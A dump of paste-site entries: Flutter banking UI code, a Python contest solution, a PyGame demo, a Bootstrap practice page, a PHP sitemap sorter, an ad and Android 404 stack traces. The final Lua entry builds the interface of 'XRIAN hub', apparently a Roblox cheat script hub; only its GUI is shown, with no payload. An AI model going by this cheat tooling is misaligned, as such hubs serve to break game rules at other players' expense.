      size: const Size(300, 300),
      maximumColorCount: 20,
    );

    Color? rawColor = paletteGenerator.dominantColor?.color ??
        paletteGenerator.vibrantColor?.color ??
        paletteGenerator.mutedColor?.color;

    setState(() {
      backgroundColor = rawColor != null
          ? lightenColor(rawColor, 0.4) // You can adjust brightness (0.1–0.5)
          : Colors.grey.shade200;
    });
  }

  @override
  Widget build(BuildContext context) {
    return Consumer(builder: (_, ref, __) {
      return Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          verticalSpace(getProportionateScreenHeight(10)),
          textWidget(
            ""Recents"",
            fontWeight: FontWeight.w700,
            fontSize: getProportionateScreenWidth(17),
            color: ref.watch(generalNotifierProvider) ? white : lightBlack,
          ),
          verticalSpace(getProportionateScreenHeight(10)),
          SizedBox(
            height: getProportionateScreenHeight(90),
            child: ListView.separated(
              scrollDirection: Axis.horizontal,
              itemCount: beneficiaryList.length,
              itemBuilder: (context, index) {
                final beneficiary = beneficiaryList[index];
                return RecentBeneficiaryCards(beneficiaryBank: beneficiary);
              },
              separatorBuilder: (_, __) => const SizedBox(width: 16),
            ),
          ),
        ],
      );
    });
  }
}

class BankListSection extends StatelessWidget {
  BankListSection({super.key});

  final List<Bank> banks = [
    const Bank(name: ""Kuda Bank"", imagePath: ""assets/banks/kuda-bank.png""),
    const Bank(
        name: ""First Bank Of Nigeria"", imagePath: ""assets/banks/firstbank.png""),
    const Bank(name: ""Fidelity Bank"", imagePath: ""assets/banks/fidelity.png""),
    const Bank(
        name: ""United Bank for Africa"",
        imagePath: ""assets/banks/united-bank-for-africa.png""),
    const Bank(
        name: ""Sterling Bank"", imagePath: ""assets/banks/sterling-bank.png""),
    const Bank(name: ""Jaiz Bank"", imagePath: ""assets/banks/jaiz-bank.png""),
    const Bank(name: ""Paycom"", imagePath: ""assets/banks/paycom.png""),
    const Bank(name: ""GTB"", imagePath: ""assets/banks/gtb.png""),
    const Bank(
        name: ""Stanbic IBTC Bank"",
        imagePath: ""assets/banks/stanbic-ibtc-bank.png""),
    const Bank(
        name: ""Suntrust Bank"", imagePath: ""assets/banks/suntrust-bank.png""),
    const Bank(name: ""Zenith Bank"", imagePath: ""assets/banks/zenith-bank.png""),
    const Bank(name: ""Wema Bank"", imagePath: ""assets/banks/wema-bank.png""),
  ];

  @override
  Widget build(BuildContext context) {
    return Consumer(builder: (_, ref, __) {
      return Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          textWidget(
            ""Select Bank"",
            fontWeight: FontWeight.w700,
            fontSize: getProportionateScreenWidth(17),
            color: ref.watch(generalNotifierProvider) ? white : lightBlack,
          ),
          verticalSpace(getProportionateScreenHeight(10)),
          ...banks.map((bank) {
            return BankTile(
              bank: bank,
              onTap: () {
                ref
                    .read(routerProvider)
                    .pushNamed(AppRoute.sendMoneyContinueScreen.name);
              },
            );
          }),
        ],
      );
    });
  }
}

class BankTile extends StatefulWidget {
  final Bank bank;

  final VoidCallback? onTap;
  const BankTile({
    super.key,
    required this.bank,
    required this.onTap,
  });

  @override
  State<BankTile> createState() => _BankTileState();
}

class _BankTileState extends State<BankTile> {
  Color backgroundColor = Colors.grey.shade200;

  @override
  void initState() {
    super.initState();
    _updatePalette();
  }

  Color lightenColor(Color color, [double amount = 0.3]) {
    final hsl = HSLColor.fromColor(color);
    final lightened =
        hsl.withLightness((hsl.lightness + amount).clamp(0.0, 1.0));
    return lightened.toColor();
  }

  Future<void> _updatePalette() async {
    final imageProvider = AssetImage(widget.bank.imagePath);

    final paletteGenerator = await PaletteGenerator.fromImageProvider(
      imageProvider,
      size: const Size(300, 300),
      maximumColorCount: 20,
    );

    Color? rawColor = paletteGenerator.dominantColor?.color ??
        paletteGenerator.vibrantColor?.color ??
        paletteGenerator.mutedColor?.color;

    setState(() {
      backgroundColor = rawColor != null
          ? lightenColor(rawColor, 0.4) // adjust brightness (0.1–0.5)
          : Colors.grey.shade200;
    });
  }

  @override
  Widget build(BuildContext context) {
    return Consumer(builder: (_, ref, __) {
      return InkWell(
        onTap: widget.onTap,
        splashColor: transparent,
        highlightColor: transparent,
        child: Container(
          margin: EdgeInsets.only(bottom: getProportionateScreenHeight(10)),
          padding: EdgeInsets.only(bottom: getProportionateScreenHeight(15)),
          decoration: BoxDecoration(
              border: Border(
            bottom: BorderSide(
              color: ref.watch(generalNotifierProvider)
                  ? white.withOpacity(0.05)
                  : lightBlack.withOpacity(0.05),
            ),
          )),
          child: Row(
            children: [
              Container(
                padding: const EdgeInsets.all(7),
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: backgroundColor,
                ),
                child: Container(
                  height: 25,
                  width: 25,
                  decoration: BoxDecoration(
                    shape: BoxShape.circle,
                    image: DecorationImage(
                      image: AssetImage(widget.bank.imagePath),
                      fit: BoxFit.cover,
                    ),
                  ),
                ),
              ),
              horizontalSpace(
                getProportionateScreenWidth(10),
              ),
              textWidget2(
                widget.bank.name,
                fontWeight: FontWeight.w500,
                fontSize: getProportionateScreenWidth(14),
                color: ref.watch(generalNotifierProvider)
                    ? white.withOpacity(0.9)
                    : lightBlack.withOpacity(0.9),
              ),
              const Spacer(),
              Container(
                padding: const EdgeInsets.all(3),
                decoration: BoxDecoration(
                  shape: BoxShape.circle,
                  color: (ref.watch(generalNotifierProvider)
                      ? primaryBaseDarkmode
                      : primaryBaseWhite),
                ),
                child: iconWidget(PhosphorIcons.caret_right_bold,
                    size: 16,
                    color: ref.watch(generalNotifierProvider)
                        ? white.withOpacity(0.64)
                        : lightBlack.withOpacity(0.64)),
              ),
            ],
          ),
        ),
      );
    });
  }
}

class RecentBeneficiaryCards extends StatefulWidget {
  final BeneficiaryBank beneficiaryBank;
  const RecentBeneficiaryCards({super.key, required this.beneficiaryBank});

  @override
  State<RecentBeneficiaryCards> createState() => _RecentBeneficiaryCardsState();
}

class _RecentBeneficiaryCardsState extends State<RecentBeneficiaryCards> {
  Color backgroundColor = Colors.grey.shade200;

  @override
  void initState() {
    super.initState();
    _updatePalette();
  }

  Color lightenColor(Color color, [double amount = 0.3]) {
    final hsl = HSLColor.fromColor(color);
    final lightened =
        hsl.withLightness((hsl.lightness + amount).clamp(0.0, 1.0));
    return lightened.toColor();
  }

  Future<void> _updatePalette() async {
    final imageProvider = AssetImage(widget.beneficiaryBank.imagePath);

    final paletteGenerator = await PaletteGenerator.fromImageProvider(
      imageProvider,
      size: const Size(300, 300),
      maximumColorCount: 20,
    );

    Color? rawColor = paletteGenerator.dominantColor?.color ??
        paletteGenerator.vibrantColor?.color ??
        paletteGenerator.mutedColor?.color;

    setState(() {
      backgroundColor = rawColor != null
          ? lightenColor(rawColor, 0.5) // adjust brightness–
          : Colors.grey.shade200;
    });
  }

  @override
  Widget build(BuildContext context) {
    return Column(
      children: [
        Container(
          padding: const EdgeInsets.all(7),
          decoration: BoxDecoration(
            shape: BoxShape.circle,
            color: backgroundColor,
          ),
          child: Container(
            height: 25,
            width: 25,
            decoration: BoxDecoration(
              shape: BoxShape.circle,
              image: DecorationImage(
                image: AssetImage(widget.beneficiaryBank.imagePath),
                fit: BoxFit.cover,
              ),
            ),
          ),
        ),
        const SizedBox(height: 5),
        SizedBox(
          width: 70,
          child: Text(
            widget.beneficiaryBank.firstName,
            style: GoogleFonts.poppins(
              fontSize: getProportionateScreenWidth(12),
              fontWeight: FontWeight.w400,
            ),
            overflow: TextOverflow.ellipsis,
            textAlign: TextAlign.center,
          ),
        ),
        SizedBox(
          width: 70,
          child: Text(
            widget.beneficiaryBank.lastName,
            style: GoogleFonts.poppins(
              fontSize: getProportionateScreenWidth(12),
              fontWeight: FontWeight.w400,
            ),
            overflow: TextOverflow.ellipsis,
            textAlign: TextAlign.center,
          ),
        ),
      ],
    );
  }
}

//
"
97zT9W5u,Untitled,Um_nik,Python,Thursday 29th of May 2025 04:55:58 AM CDT,"n, m = map(int, input().split())
hands = [tuple(map(int, input().split())) for _ in range(n)]
_cuts = [tuple(map(int, input().split())) for _ in range(m)]
edges = [[] for u in range(n + 1)]
edge_cnt = [{} for u in range(n + 1)]

for u, (l, r) in enumerate(hands, 1):
    for v in [l, r]:
        if v == -1:
            continue
        _u, _v = min(u, v), max(u, v)
        edge_cnt[_u][_v] = edge_cnt[_u].get(_v, 0) + 1

cuts = [
    (min(u, v), max(u, v))
    for m, lr in _cuts
    if (u := m) and (v := hands[m - 1][lr - 1])
]

for u, v in cuts:
    edge_cnt[u][v] -= 1

for u in range(1, n + 1):
    for v in edge_cnt[u]:
        if edge_cnt[u][v] > 0:
            edges[u].append(v)

res, rank = [-1]*(n + 1), [0]*(n + 1)
p = [i for i in range(n + 1)]
c = [set() for i in range(n + 1)]

def get(x):
    stk = []
    while x != p[x]:
        stk.append(x)
        x = p[x]
    for i in stk:
        c[p[i]].remove(i)
        c[x].add(i)
        p[i] = x
    return x

def union(u, v):
    pu, pv = get(u), get(v)
    if pu == pv:
        return
    if rank[pu] == rank[pv]:
        rank[pu] += 1
    if rank[pu] < rank[pv]:
        pu, pv = pv, pu
    p[pv] = pu
    c[pu].add(pv)

def set(x, idx):
    stk = [x]
    while stk:
        cur = stk.pop()
        res[cur] = idx
        stk.extend(c[cur])

for u in range(1, n + 1):
    for v in edges[u]:
        union(u, v)

for idx, (u, v) in list(enumerate(cuts))[::-1]:
    p1, pu, pv = get(1), get(u), get(v)
    if pu == pv == p1:
        continue
    if p1 in [pu, pv]:
        set(pu, idx) if pu != p1 else set(pv, idx)
    union(u, v)

print(""\n"".join(map(str, res[1:])))
"
kH5UDKgH,Python - PyGame - keep ciicked (Stackoverflow),furas,Python,Thursday 29th of May 2025 03:37:47 AM CDT,"#!/usr/bin/env python3

# date: 2025.05.29
# stackoverflow: [python - PYGAME Circle changes colour on clicking but changes back on mouse up - Stack Overflow](https://stackoverflow.com/questions/79639247/pygame-circle-changes-colour-on-clicking-but-changes-back-on-mouse-up)

import pygame
import random

# --- constants ---  # PEP8: constants after imports

# display window
SCREEN_HEIGHT = 800
SCREEN_WIDTH = 1400

# colours
BLUE = (0, 0, 255)
LIGHTBLUE = (72, 243, 235)
BLUEBLACK = (20, 21, 77)
IODINE = (243, 200, 99)
REDYELLOW = (221, 78, 20)
BLACK = (0, 0, 0)

# other
X = 500
Y = 400

SIZE = 40
X_SPACING = SIZE*2.3
Y_SPACING = SIZE*2.3

# --- classes ---  # PEP8: classes after constants

class Experiment():
    def __init__ (self, colour, x, y, size, number):
        self.x = x
        self.y = y
        self.size = size
        self.number = number
        self.colour = colour

        self.rect = pygame.Rect(self.x-self.size, self.y-self.size, self.size*2, self.size*2)

        self.clicked = False

    def draw(self, screen):
        #pygame.draw.rect(screen, LIGHTBLUE, self.rect)

        if self.clicked:
            pygame.draw.circle(screen, BLACK, (self.x, self.y), self.size )
        else:
            pygame.draw.circle(screen, self.colour, (self.x, self.y), self.size)
            pygame.draw.circle(screen, BLACK, (self.x, self.y), self.size, 4)

    def handle_event(self, event):
        if event.type == pygame.MOUSEBUTTONDOWN:
            if self.rect.collidepoint(event.pos):
                self.clicked = True

# --- functions ---  # PEP8: functions after classes

# --- main ---  # # PEP8: main code after functions

# - variables -

wellcolour = IODINE
colour = IODINE

# - init -

pygame.init()

screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
pygame.display.set_caption('Amylase')

# - create all instances only once, using for-loop, and keep them on list

items = []

for row in range(4):
    wellcolour = (243, row*40+100, 99)
    for col in range(5):
        x = X + (col * X_SPACING)
        y = Y + (row * Y_SPACING)
        number = col + (row * 5) + 1

        item = Experiment(wellcolour, x, y, SIZE, number)

        items.append(item)

# - main loop -

run = True

while run:

    # - events -

    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            run = False
        # send every event to all items
        for item in items:
            item.handle_event(event)

    # - updates (without drawing) -

    # update all items
    # for item in items:
    #     pass  # empty function

    # - draws (without updates) -

    screen.fill(LIGHTBLUE)

    # draw all items
    for item in items:
        item.draw(screen)

    pygame.display.flip()

# - end -

pygame.quit()
"
NnTCEpy6,Untitled,bbarbara,HTML,Thursday 29th of May 2025 03:29:33 AM CDT,"<!DOCTYPE html>
<html lang=""hu"">
  <head>
    <meta charset=""UTF-8"" />
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"" />
    <title>Bootstap</title>
    <!-- Bootstrap js és css betöltése -->
    <link
      rel=""stylesheet""
      href=""https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css""
    />
    <script src=""https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js""></script>
    <script src=""https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js""></script>
    <link rel=""stylesheet"" href=""css/style.css"" />
  </head>
  <body>
    <div id=""banner"" class=""container-fluid"">
        <div class=""container"">
        <img class=""img-fluid"" src=""kepek/banner.jpg""></div>
    </div>
    <!--div.container-fluid>div.container>div.row>div*3-->
    <div class=""container-fluid"">
      <div class=""container"">
        <div class=""row"">
          <div class=""col-xs-12 col-md-6 col-lg-3"">
            <img src=""kepek/ktm.webp"" class=""img-fluid"" />
            <h2>Motor</h2>
            <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Possimus rerum iste libero.</p>
            <a class=""btn btn-primary"" href=""#"">Bővebben</a>
          </div>
          <div class=""col-xs-12 col-md-6 col-lg-3"">
            <img src=""kepek/ktm2.webp"" class=""img-fluid"" /> <!--A képnek is abba a classba kell lennie, mint a konténernek-->
            <h2>Motor</h2>
            <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Possimus rerum iste libero.</p>
            <a class=""btn btn-danger"" href=""#"">Bővebben</a> <!--Gomb kinézetű link, a danger az piros, a primary az kék, 
             # jel segítségéve tudunk ál linket csinálni a gyakorláshoz-->
          </div>
          <div class=""col-xs-12 col-md-6 col-lg-3"">
            <img src=""kepek/ktm3.webp"" class=""img-fluid"" />
            <h2>Motor</h2>
            <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Possimus rerum iste libero.</p>
            <a class=""btn btn-primary"" href=""#"">Bővebben</a>
          </div>
          <div class=""col-xs-12 col-md-6 col-lg-3"">
            <img src=""kepek/ktm4.webp"" class=""img-fluid"" />
            <h2>Motor</h2>
            <p>Lorem ipsum dolor sit amet consectetur adipisicing elit. Possimus rerum iste libero.</p>
            <a class=""btn btn-primary"" href=""#"">Bővebben</a>
          </div>
        </div>
      </div>
    </div>
    <div class=""container-fluid"" id=""bemutatkozás"">
        <div class=""container"">
            <div class=""row"">
                <!--a d-none azt jelenti jelenleg, hogy a mobilon a sapi ne jelenjen meg, de minde más nézetbe jelenjen meg-->
                <div class=""d-none d-md-block col-xs-12 col-md-4 col""><img src=""kepek/helmet.webp"" class=""img-fluid"" class=""hide-mobile"" /></div>
                <div class=""col-xs-12 col-md-8 col""><p>A KTM Motors egy prémium minőségű motorokat és motorkerékpáros kiegészítőket forgalmazó szakbolt, mely a motorosok igényeit maximálisan figyelembe véve kínálja termékeit. Az üzletünkben kizárólag a KTM világvezető motorkerékpár márka legújabb modelljei találhatóak meg, kezdve a sportos túramotoroktól egészen a versenyzéshez tervezett gépekig. Szakképzett munkatársaink minden vásárlónk számára személyre szabott tanácsadással segítenek a legmegfelelőbb motor és felszerelés kiválasztásában. Célunk, hogy minden motoros, kezdőtől a profikig, megtalálja nálunk a számára legideálisabb járművet és kiegészítőket. Emellett szervizszolgáltatásokat is kínálunk, ahol gyors és precíz munkával biztosítjuk motorja hosszú élettartamát. A KTM Motors nem csupán egy bolt, hanem egy közösség, ahol a motorozás iránti szenvedély és a szakértelem találkozik. Kínálatunkban megtalálhatóak a legújabb motoros ruházatok, sisakok, protektorok, és minden egyéb, ami a biztonságos motorozáshoz szükséges. Az üzletünkben folyamatosan frissülő akciók és egyedi ajánlatok várják a vásárlókat, így mindig érdemes ellátogatni hozzánk. A KTM Motors célja, hogy minden motoros számára biztosítson egy prémium élményt, legyen szó vásárlásról, szervizről vagy akár közösségi programokról. Nálunk minden motoros megtalálhatja a saját stílusának és igényeinek megfelelő motort!</p></div>
            </div>
        </div>
    </div>
    <div id=""fekete"" class=""container-fluid"">
        <div class=""container"">
            <div class=""row"">
                <div class=""col-xs-12 col-md-6"">
                    <h3>Termékeink</h3> 
                    <ui>
                        <li>Lorem ipsum dolor sit amet.</li>
                        <li>Lorem ipsum dolor sit amet consectetur.</li>
                        <li>Lorem ipsum dolor sit.</li>
                </ui>
            </div>
                <div class=""col-xs-12 col-md-6"">
                    <h3>Termékeink</h3> 
                    <ui>
                        <li>Lorem ipsum dolor sit amet.</li>
                        <li>Lorem ipsum dolor sit amet consectetur.</li>
                        <li>Lorem ipsum dolor sit.</li>
                    </ui>
                </div>
            </div>
        </div>
    </div>
  </body>
</html>
"
5S7C4m27,curl sitemap reorder,ssaidz,PHP,Thursday 29th of May 2025 03:10:42 AM CDT,"<?php
// Cek apakah form sudah dikirim
$urlInput = $_POST['url'] ?? '';
$data = [];
$error = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($urlInput)) {
    $url = trim($urlInput);

    // Ambil konten sitemap via cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $xmlContent = curl_exec($ch);
    curl_close($ch);

    if ($xmlContent) {
        libxml_use_internal_errors(true);
        $xml = simplexml_load_string($xmlContent);
        if ($xml !== false) {
            $namespaces = $xml->getNamespaces(true);
            if (isset($namespaces[''])) {
                $xml->registerXPathNamespace('ns', $namespaces['']);
                $urls = $xml->xpath('//ns:url');
            } else {
                $urls = $xml->url;
            }

            // Konversi ke array dan sorting
            foreach ($urls as $url) {
                $loc = (string)$url->loc;
                $lastmod = (string)$url->lastmod;
                $data[] = [
                    'loc' => $loc,
                    'lastmod' => $lastmod,
                    'timestamp' => strtotime($lastmod),
                ];
            }

            usort($data, function($a, $b) {
                return $b['timestamp'] - $a['timestamp'];
            });
        } else {
            $error = ""Gagal memproses XML."";
        }
    } else {
        $error = ""Gagal mengambil data dari URL."";
    }
}
?>

<!DOCTYPE html>
<html lang=""id"">
<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <title>Reverse Sitemap by Lastmod</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            padding: 1rem;
            margin: 0;
            background: #f5f5f5;
        }

        .container {
            max-width: 800px;
            margin: auto;
            background: white;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
        }

        h1 {
            text-align: center;
            font-size: 1.8rem;
            margin-bottom: 1rem;
        }

        form {
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }

        input[type=""text""] {
            padding: 0.75rem;
            font-size: 1rem;
            border-radius: 4px;
            border: 1px solid #ccc;
        }

        input[type=""submit""] {
            padding: 0.75rem;
            background-color: #007BFF;
            border: none;
            color: white;
            font-weight: bold;
            font-size: 1rem;
            border-radius: 4px;
            cursor: pointer;
        }

        input[type=""submit""]:hover {
            background-color: #0056b3;
        }

        .error {
            color: red;
            font-weight: bold;
        }

        .results {
            margin-top: 2rem;
        }

        .url-entry {
            margin-bottom: 0.75rem;
        }

        a {
            color: #007BFF;
            text-decoration: none;
            word-wrap: break-word;
        }

        a:hover {
            text-decoration: underline;
        }

        .timestamp {
            display: block;
            color: #555;
            font-size: 0.9rem;
        }

        @media (max-width: 600px) {
            input[type=""text""], input[type=""submit""] {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <div class=""container"">
        <h1>Urutkan Sitemap Berdasarkan Lastmod</h1>
        <form method=""POST"">
            <input type=""text"" name=""url"" placeholder=""Masukkan URL sitemap.xml"" value=""<?= htmlspecialchars($urlInput) ?>"" required>
            <input type=""submit"" value=""Ambil & Urutkan"">
        </form>

        <?php if (!empty($error)): ?>
            <p class=""error""><?= htmlspecialchars($error) ?></p>
        <?php endif; ?>

        <?php if (!empty($data)): ?>
            <div class=""results"">
                <h2>Hasil Terurut:</h2>
                <?php foreach ($data as $entry): ?>
                    <div class=""url-entry"">
                        <a href=""<?= htmlspecialchars($entry['loc']) ?>"" target=""_blank"">
                            <?= htmlspecialchars($entry['loc']) ?>
                        </a>
                        <span class=""timestamp"">Last modified: <?= htmlspecialchars($entry['lastmod']) ?></span>
                    </div>
                <?php endforeach; ?>
            </div>
        <?php endif; ?>
    </div>
</body>
</html>
"
SMCNVtRp,Professional eCommerce Website Development | Digital Hive,digitalhive,HTML,Thursday 29th of May 2025 02:37:06 AM CDT,"Want to take your online business to the next level?
At Digital Hive, we build high-performance eCommerce websites that convert.

Whether you're a startup or scaling brand, we design and develop online stores that are:

✅ Fast & Secure
✅ Mobile-Responsive
✅ SEO-Optimized
✅ Integrated with Payment Gateways & Inventory Systems
✅ Built on Shopify, WooCommerce & Custom Platforms

Why settle for average when your eCommerce site can be a sales machine?

Let us craft an experience that drives traffic, boosts conversions, and grows your brand.

Explore our eCommerce services now: https://digitalhive.in/ecommerce-websites/
"
D5EMzbYw,2025-05-29T14:30:51.492318,powerampache,PHP,Thursday 29th of May 2025 01:30:53 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1251)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:668)
	at java.lang.Thread.run(Thread.java:1012)

getArtists() - cannot load data HttpException {""code"":404,""message"":"""",""detailMessage"":""HTTP 404 "",""stackTrace"":[]}"
BtM3YhX8,2025-05-29T14:30:51.533744,powerampache,PHP,Thursday 29th of May 2025 01:30:53 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1251)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:668)
	at java.lang.Thread.run(Thread.java:1012)

getSongs() - cannot load data HttpException {""code"":404,""message"":"""",""detailMessage"":""HTTP 404 "",""stackTrace"":[]}"
dZ5BZEWA,2025-05-29T14:30:51.533215,powerampache,PHP,Thursday 29th of May 2025 01:30:53 AM CDT,"1.01-80 (80) - DB: 83
retrofit2.HttpException: HTTP 404 
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1251)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:668)
	at java.lang.Thread.run(Thread.java:1012)

getAlbums() - cannot load data HttpException {""code"":404,""message"":"""",""detailMessage"":""HTTP 404 "",""stackTrace"":[]}"
FvSLyPuz,xrian hub,GREGORIAH_lol,Lua,Thursday 29th of May 2025 01:03:29 AM CDT,"--xrian final
local _1 = Instance.new(""ScreenGui"")
local Frame = Instance.new(""Frame"")
local UICorner = Instance.new(""UICorner"")
local TextLabel = Instance.new(""TextLabel"")
local UIGradient = Instance.new(""UIGradient"")
local TextButton = Instance.new(""TextButton"")
local UICorner_2 = Instance.new(""UICorner"")
local Frame_2 = Instance.new(""Frame"")
local ScrollingFrame = Instance.new(""ScrollingFrame"")
local UIListLayout = Instance.new(""UIListLayout"")
local TextButton_2 = Instance.new(""TextButton"")
local UICorner_3 = Instance.new(""UICorner"")
local UIGradient_2 = Instance.new(""UIGradient"")
local TextButton_3 = Instance.new(""TextButton"")
local UICorner_4 = Instance.new(""UICorner"")
local UIGradient_3 = Instance.new(""UIGradient"")
local TextButton_4 = Instance.new(""TextButton"")
local UICorner_5 = Instance.new(""UICorner"")
local UIGradient_4 = Instance.new(""UIGradient"")
local TextButton_5 = Instance.new(""TextButton"")
local UICorner_6 = Instance.new(""UICorner"")
local UIGradient_5 = Instance.new(""UIGradient"")
local TextButton_6 = Instance.new(""TextButton"")
local UICorner_7 = Instance.new(""UICorner"")
local UIGradient_6 = Instance.new(""UIGradient"")
local TextButton_7 = Instance.new(""TextButton"")
local UICorner_8 = Instance.new(""UICorner"")
local UIGradient_7 = Instance.new(""UIGradient"")
local TextButton_8 = Instance.new(""TextButton"")
local UICorner_9 = Instance.new(""UICorner"")
local UIGradient_8 = Instance.new(""UIGradient"")
local TextButton_9 = Instance.new(""TextButton"")
local UICorner_10 = Instance.new(""UICorner"")
local UIGradient_9 = Instance.new(""UIGradient"")
local TextButton_10 = Instance.new(""TextButton"")
local UICorner_11 = Instance.new(""UICorner"")
local UIGradient_10 = Instance.new(""UIGradient"")
local TextButton_11 = Instance.new(""TextButton"")
local UICorner_12 = Instance.new(""UICorner"")
local UIGradient_11 = Instance.new(""UIGradient"")
local TextButton_12 = Instance.new(""TextButton"")
local UICorner_13 = Instance.new(""UICorner"")
local UIGradient_12 = Instance.new(""UIGradient"")
local TextButton_13 = Instance.new(""TextButton"")
local UICorner_14 = Instance.new(""UICorner"")
local UIGradient_13 = Instance.new(""UIGradient"")
local TextButton_14 = Instance.new(""TextButton"")
local UICorner_15 = Instance.new(""UICorner"")
local UIGradient_14 = Instance.new(""UIGradient"")
local TextButton_15 = Instance.new(""TextButton"")
local UICorner_16 = Instance.new(""UICorner"")
local UIGradient_15 = Instance.new(""UIGradient"")
local TextButton_16 = Instance.new(""TextButton"")
local UICorner_17 = Instance.new(""UICorner"")
local UIGradient_16 = Instance.new(""UIGradient"")
local UIGradient_17 = Instance.new(""UIGradient"")
_1.Name = ""1""
_1.Parent = game.Players.LocalPlayer:WaitForChild(""PlayerGui"")
_1.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
_1.ResetOnSpawn = false
Frame.Parent = _1
Frame.AnchorPoint = Vector2.new(0.5, 0.5)
Frame.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
Frame.Size = UDim2.new(0, 757, 0, 551)
UICorner.CornerRadius = UDim.new(0, 15)
UICorner.Parent = Frame
TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Size = UDim2.new(0, 757, 0, 27)
TextLabel.Font = Enum.Font.Unknown
TextLabel.Text = ""XRIAN hub""
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true
UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient.Rotation = 180
UIGradient.Parent = TextLabel
TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.861294568, 0, -0.0344827585, 0)
TextButton.Size = UDim2.new(0, 81, 0, 25)
TextButton.Font = Enum.Font.Unknown
TextButton.Text = ""X""
TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true
UICorner_2.CornerRadius = UDim.new(0, 10)
UICorner_2.Parent = TextButton
Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.00899999961, 0, 0.0500000007, 0)
Frame_2.Size = UDim2.new(0, 743, 0, 1)
ScrollingFrame.Parent = Frame
ScrollingFrame.Active = true
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ScrollingFrame.BackgroundTransparency = 1.000
ScrollingFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.Position = UDim2.new(0.00792602357, 0, 0.0653357506, 0)
ScrollingFrame.Size = UDim2.new(0, 743, 0, 492)
ScrollingFrame.ScrollBarThickness = 6
UIListLayout.Parent = ScrollingFrame
UIListLayout.FillDirection = Enum.FillDirection.Horizontal
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayout.Padding = UDim.new(0, 10)
UIListLayout.Wraps = true
TextButton_2.Parent = ScrollingFrame
TextButton_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.BorderSizePixel = 0
TextButton_2.Size = UDim2.new(0, 126, 0, 58)
TextButton_2.Font = Enum.Font.FredokaOne
TextButton_2.Text = ""IY""
TextButton_2.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_2.TextSize = 25.000
TextButton_2.TextWrapped = true
UICorner_3.CornerRadius = UDim.new(0, 15)
UICorner_3.Parent = TextButton_2
